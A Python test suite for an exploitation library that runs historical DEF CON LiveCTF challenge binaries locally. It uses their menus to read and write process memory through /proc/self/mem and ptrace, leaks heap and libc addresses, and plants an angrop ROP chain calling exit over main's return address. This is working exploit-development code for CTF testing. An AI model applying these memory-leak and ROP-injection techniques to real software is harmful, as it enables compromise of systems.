"""End-to-end discovery and ROP tests on exact historical LiveCTF binaries.

Enable these process-interaction tests with ``PWNC_LIVECTF_TESTS=1``.  The
content-addressed fixture layer downloads and authenticates the release
handouts before either binary is executed.
"""

from __future__ import annotations

import os
import platform
import signal
import sys
import tempfile
import unittest
from pathlib import Path

from pwnlib.context import context
from pwnlib.tubes.process import process

from payloads.angrop_backend import AngropDirectCall, AngropDiscoveryOptions, AngropImageSpec, prepare_angrop
from payloads.arbio import ArbitraryMemory, IOPrimitiveTraits
from payloads.discovery import DiscoveryNotFoundError, ExactProcessDiscovery, MemorySpan
from payloads.pwntools_compat import ExactELFAdapter
from payloads.rop import ROPChain
from payloads.tests.runtime_support.livectf import load_manifest, provision_handout

_OPT_IN = os.environ.get("PWNC_LIVECTF_TESTS") == "1"
_NATIVE_AMD64 = sys.platform.startswith("linux") and platform.machine().lower() in {
    "amd64",
    "x86_64",
}
_SEEK_MENU = b"What do you want to do?\n1. Open file\n2. Close file\n3. Write to file\n4. Read from file\n> "


def _challenge_environment() -> dict[str, str]:
    """Keep host loader controls and an oversized ambient environment out."""

    return {"PATH": os.defpath, "LANG": "C", "LC_ALL": "C"}


def _kill_process_group(tube: process) -> None:
    """Bound cleanup to the dedicated process group created by pwntools."""

    if tube.poll() is not None:
        return
    try:
        group = os.getpgid(tube.pid)
        if group != os.getpgrp():
            os.killpg(group, signal.SIGKILL)
    except (ProcessLookupError, PermissionError):
        pass


def _bounded_status(tube: process, timeout: float = 5) -> int | None:
    tube.wait_for_close(timeout=timeout)
    return tube.poll()


class _SeekAndDestroyMemory:
    """Use the challenge's menu as a local payload-debugging transport only.

    Production discovery receives only the resulting callbacks.  Neither the
    payload APIs nor generated exploits assume that ``/proc/self/mem`` exists
    locally or on a remote target.
    """

    def __init__(self, tube: process) -> None:
        self.tube = tube
        self.mode: bytes | None = None
        self.expect_process_exit = False
        opening = tube.recvuntil(_SEEK_MENU, timeout=5)
        if not opening.endswith(_SEEK_MENU):
            raise RuntimeError("seek-and-destroy did not produce its initial menu")

    def _choice(self, value: int) -> None:
        self.tube.sendline(str(value).encode())

    def _finish_operation(self) -> bytes:
        try:
            response = self.tube.recvuntil(_SEEK_MENU, timeout=5)
        except EOFError:
            if self.expect_process_exit:
                return b""
            raise
        if not response.endswith(_SEEK_MENU):
            raise OSError(f"seek-and-destroy operation timed out: {response!r}")
        return response[: -len(_SEEK_MENU)]

    def open_file(self, path: bytes, mode: bytes) -> None:
        self._choice(1)
        self.tube.sendline(path)
        self.tube.sendline(mode)
        output = self._finish_operation()
        if output:
            raise OSError(f"seek-and-destroy could not open {path!r}: {output!r}")
        self.mode = mode

    def read_current_file(self, address: int, size: int) -> bytes:
        self._choice(4)
        self.tube.recvuntil(b"Where in the file do you want to read? ", timeout=5)
        self.tube.sendline(f"{address:x}".encode())
        self.tube.recvuntil(b"How much do you want to read? ", timeout=5)
        self.tube.sendline(f"{size:x}".encode())
        output = self._finish_operation()
        if len(output) != size:
            raise OSError(f"short seek-and-destroy read at {address:#x}: {output!r}")
        return output

    def read_at(self, address: int, size: int) -> bytes:
        if self.mode != b"rb":
            self.open_file(b"/proc/self/mem", b"rb")
        return self.read_current_file(address, size)

    def write_at(self, address: int, data: bytes) -> int:
        self._choice(3)
        self.tube.recvuntil(b"Where in the file do you want to write? ", timeout=5)
        self.tube.sendline(f"{address:x}".encode())
        self.tube.recvuntil(b"How much do you want to write? ", timeout=5)
        self.tube.sendline(f"{len(data):x}".encode())
        self.tube.send(data)
        output = self._finish_operation()
        if output:
            raise OSError(f"seek-and-destroy write at {address:#x} failed: {output!r}")
        self.mode = b"wb"
        return len(data)


class _PtraceMemory:
    """Expose ptrace-me-maybe's word operations as exact byte reads/writes."""

    PEEKDATA = 2
    PEEKUSER = 3
    POKEDATA = 5

    def __init__(self, tube: process) -> None:
        self.tube = tube
        self.closed = False

    def call(self, request: int, address: int = 0, data: int = 0, *, again: bool = True) -> int:
        self.tube.recvuntil(b"What ptrace request do you want to send?", timeout=5)
        self.tube.sendline(f"{request:x}".encode())
        self.tube.recvuntil(b"What address do you want?", timeout=5)
        self.tube.sendline(f"{address:x}".encode())
        self.tube.recvuntil(b"What do you want copied into data?", timeout=5)
        self.tube.sendline(f"{data:x}".encode())
        self.tube.recvuntil(b"ptrace returned 0x", timeout=5)
        result = int(self.tube.recvline(timeout=5).strip(), 16)
        diagnostic = self.tube.recvuntil(b"Do another (0/1)?\n", timeout=5)
        self.tube.sendline(b"1" if again else b"0")
        if not again:
            self.closed = True
        if b"ptrace error:" in diagnostic:
            raise OSError(f"ptrace request {request} at {address:#x} failed: {diagnostic!r}")
        return result

    def read_at(self, address: int, size: int) -> bytes:
        if not size:
            return b""
        first = address & -8
        end = (address + size + 7) & -8
        words = bytearray()
        for current in range(first, end, 8):
            words.extend(self.call(self.PEEKDATA, current).to_bytes(8, "little"))
        offset = address - first
        return bytes(words[offset : offset + size])

    def write_at(self, address: int, data: bytes) -> int:
        if address % 8 or len(data) % 8:
            raise OSError("ptrace-me-maybe writes require aligned whole AMD64 words")
        for offset in range(0, len(data), 8):
            self.call(self.POKEDATA, address + offset, int.from_bytes(data[offset : offset + 8], "little"))
        return len(data)

    def finish(self) -> None:
        if not self.closed:
            # Let the challenge perform its own PTRACE_DETACH after leaving the
            # loop.  A final harmless register read keeps the protocol exact.
            self.call(self.PEEKUSER, 16 * 8, again=False)


def _exact_adapters(root: Path) -> tuple[ExactELFAdapter, ExactELFAdapter, ExactELFAdapter]:
    return (
        ExactELFAdapter.from_file(root / "challenge"),
        ExactELFAdapter.from_file(root / "libc.so.6"),
        ExactELFAdapter.from_file(root / "ld-linux-x86-64.so.2"),
    )


def _read_maps_prefix(transport: _SeekAndDestroyMemory) -> bytes:
    """Read bounded, complete chunks until the two required mappings appear."""

    result = bytearray()
    for offset in range(0, 0x4000, 0x100):
        try:
            result.extend(transport.read_current_file(offset, 0x100))
        except OSError:
            break
        lines = bytes(result).splitlines()
        if any(b"[heap]" in line for line in lines) and any(
            b"libc.so.6" in line and len(line.split()) >= 3 and line.split()[2] == b"00000000" for line in lines
        ):
            return bytes(result)
    raise AssertionError("bounded /proc/self/maps debug prefix omitted the heap or libc base mapping")


def _exit_chain(libc: ExactELFAdapter, libc_base: int, slot: int, status: int) -> ROPChain:
    image = AngropImageSpec.from_adapter(libc, load_bias=libc_base, name="LiveCTF libc")
    exit_address = image.runtime_symbol("exit")
    with prepare_angrop((image,), options=AngropDiscoveryOptions(processes=1)) as session:
        result = session.synthesize_calls(
            (AngropDirectCall(exit_address, (status,), name="exit", needs_return=False),),
            chain_base=slot,
            timeout=30,
        )
    if not result.gadgets or any(item.image_sha256 != libc.identity.sha256 for item in result.gadgets):
        raise AssertionError("angrop exit chain did not retain exact-libc gadget provenance")
    return result.as_rop_chain(description="vendored-angrop exact-libc exit chain")


@unittest.skipUnless(_OPT_IN, "set PWNC_LIVECTF_TESTS=1 to run historical LiveCTF process tests")
@unittest.skipUnless(_NATIVE_AMD64, "the exact LiveCTF release handouts require native Linux AMD64")
class LiveCTFDiscoveryTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls) -> None:
        configured_cache = os.environ.get("PWNC_LIVECTF_CACHE")
        cls._temporary: tempfile.TemporaryDirectory[str] | None = None
        if configured_cache is None:
            cls._temporary = tempfile.TemporaryDirectory(prefix="pwnc-livectf-discovery-")
            cls.addClassCleanup(cls._temporary.cleanup)
            configured_cache = cls._temporary.name
        manifest = load_manifest()
        cls.seek = provision_handout(
            manifest.handouts_by_id["defcon30-seek-and-destroy"],
            configured_cache,
        )
        cls.ptrace = provision_handout(
            manifest.handouts_by_id["defcon31-ptrace-me-maybe"],
            configured_cache,
        )

    def test_seek_and_destroy_composes_every_transition_and_executes_rop(self) -> None:
        root = self.seek.root / "handout"
        main, libc, loader = _exact_adapters(root)
        argv = [
            str(root / "ld-linux-x86-64.so.2"),
            "--inhibit-cache",
            "--library-path",
            str(root),
            str(root / "challenge"),
        ]
        with context.local(log_level="error"):
            tube = process(argv, env=_challenge_environment())
        try:
            transport = _SeekAndDestroyMemory(tube)
            transport.open_file(b"/proc/self/maps", b"r")
            maps = _read_maps_prefix(transport)
            heap_line = next(line for line in maps.splitlines() if b"[heap]" in line)
            heap_start, heap_end = (int(value, 16) for value in heap_line.split()[0].split(b"-"))
            libc_line = next(
                line for line in maps.splitlines() if b"libc.so.6" in line and line.split()[2] == b"00000000"
            )
            libc_base = int(libc_line.split(b"-")[0], 16)
            heap_span = MemorySpan(heap_start, heap_end - heap_start, "LiveCTF heap mapping")

            transport.open_file(b"/proc/self/mem", b"rb")
            memory = ArbitraryMemory(
                libc.target,
                read_at=transport.read_at,
                write_at=transport.write_at,
                traits=IOPrimitiveTraits(
                    read_chunk=0x40000,
                    write_chunk=0x4000,
                    invalid_read_safe=True,
                ),
            )
            discovery = ExactProcessDiscovery(memory, main=main, libc=libc, loader=loader)

            libc_result = discovery.heap_to_libc(
                heap_start,
                heap_span=heap_span,
                libc_base=libc_base,
            )
            heap_result = discovery.libc_to_heap(
                libc_result,
                heap_base=heap_start,
                heap_span=heap_span,
            )
            self.assertTrue(heap_span.contains(heap_result.pointer))

            stack = discovery.libc_to_stack(libc_result)
            stack_scan = MemorySpan(stack.environ_pointer - 0x10000, 0x10008, "LiveCTF initial stack")
            returns = discovery.environ_to_main_returns(stack, stack_span=stack_scan)
            return_site = discovery.environ_to_main_return(stack, stack_span=stack_scan, symbol="main")
            self.assertIn(return_site, returns)

            loader_result = discovery.libc_to_loader(libc_result)
            false_header = loader_result.base + 0x2C000
            self.assertEqual(memory.read(false_header, 4), b"\x7fELF")
            with self.assertRaises(DiscoveryNotFoundError):
                discovery.libc_to_loader(
                    libc_result,
                    loader_pointer=false_header,
                    image_search_pages=1,
                )

            snapshot = discovery.loader_to_link_map(
                loader_result,
                known_images=(main, libc, loader),
            )
            self.assertEqual(snapshot.objects[0].base, return_site.main_base)
            self.assertEqual(
                {Path(item.name).name for item in snapshot.objects if item.name},
                {"linux-vdso.so.1", "libc.so.6", "ld-linux-x86-64.so.2"},
            )
            self.assertEqual(
                {Path(item.adapter.path).name for item in snapshot.objects if item.adapter is not None},
                {"libc.so.6", "ld-linux-x86-64.so.2"},
            )

            chain = _exit_chain(libc, libc_result.base, return_site.slot_address, 73)
            plan = discovery.plan_rop_insertion(return_site, chain)
            transport.expect_process_exit = True
            self.assertEqual(plan.apply(memory, verify=False), chain.byte_length)
            status = _bounded_status(tube)
            self.assertIsNotNone(status, "seek-and-destroy ROP did not terminate within five seconds")
            self.assertEqual(status, 73)
        finally:
            _kill_process_group(tube)
            tube.close()

    def test_ptrace_me_maybe_discovers_layout_and_round_trips_rop_plan(self) -> None:
        root = self.ptrace.root / "handout"
        main, libc, loader = _exact_adapters(root)
        argv = [
            str(root / "ld-linux-x86-64.so.2"),
            "--inhibit-cache",
            "--library-path",
            str(root),
            str(root / "challenge"),
        ]
        with context.local(log_level="error"):
            tube = process(argv, env=_challenge_environment())
        transport = _PtraceMemory(tube)
        mutation_attempted = False
        restoration_confirmed = True
        try:
            rip = transport.call(transport.PEEKUSER, 16 * 8)
            rsp = transport.call(transport.PEEKUSER, 19 * 8)
            memory = ArbitraryMemory(
                libc.target,
                read_at=transport.read_at,
                write_at=transport.write_at,
                traits=IOPrimitiveTraits(
                    write_alignment=8,
                    write_width=8,
                    write_chunk=8,
                    invalid_read_safe=True,
                    verify_writes=True,
                ),
            )
            discovery = ExactProcessDiscovery(memory, main=main, libc=libc, loader=loader)

            # The challenge first gives a direct libc RIP rather than a heap
            # leak.  Supplying it as the explicit candidate still exercises
            # exact automatic libc-base matching through the same transition.
            libc_result = discovery.heap_to_libc(
                rsp,
                heap_span=MemorySpan(rsp, 8, "stopped child stack word"),
                libc_pointer=rip,
            )
            stack = discovery.libc_to_stack(libc_result)
            stack_scan = MemorySpan(rsp & -8, 0x1000, "stopped child stack")
            return_site = discovery.environ_to_main_return(stack, stack_span=stack_scan, symbol="main")
            loader_result = discovery.libc_to_loader(libc_result)
            snapshot = discovery.loader_to_link_map(
                loader_result,
                known_images=(main, libc, loader),
            )
            self.assertEqual(snapshot.objects[0].base, return_site.main_base)

            chain = _exit_chain(libc, libc_result.base, return_site.slot_address, 71)
            plan = discovery.plan_rop_insertion(return_site, chain)
            original = plan.writes[0].expected
            mutation_attempted = True
            try:
                self.assertEqual(plan.apply(memory), chain.byte_length)
                self.assertEqual(memory.read(return_site.slot_address, len(original)), chain.materialize())
            finally:
                restoration_confirmed = False
                self.assertEqual(memory.write(return_site.slot_address, original), len(original))
                self.assertEqual(memory.read(return_site.slot_address, len(original)), original)
                restoration_confirmed = True

            leak = memory.as_pwntools_memleak()
            self.assertEqual(leak.q(rsp), int.from_bytes(memory.read(rsp, 8), "little"))
            transport.finish()
            status = _bounded_status(tube)
            self.assertIsNotNone(status, "ptrace-me-maybe did not terminate within five seconds")
            self.assertEqual(status, 0)
        finally:
            try:
                if tube.poll() is None and (not mutation_attempted or restoration_confirmed):
                    try:
                        transport.finish()
                        _bounded_status(tube)
                    except (EOFError, OSError, TimeoutError, ValueError):
                        pass
            finally:
                # Never detach a child whose return stack may contain a
                # partial chain. Cleanup failures cannot bypass group kill.
                _kill_process_group(tube)
                tube.close()


if __name__ == "__main__":
    unittest.main()
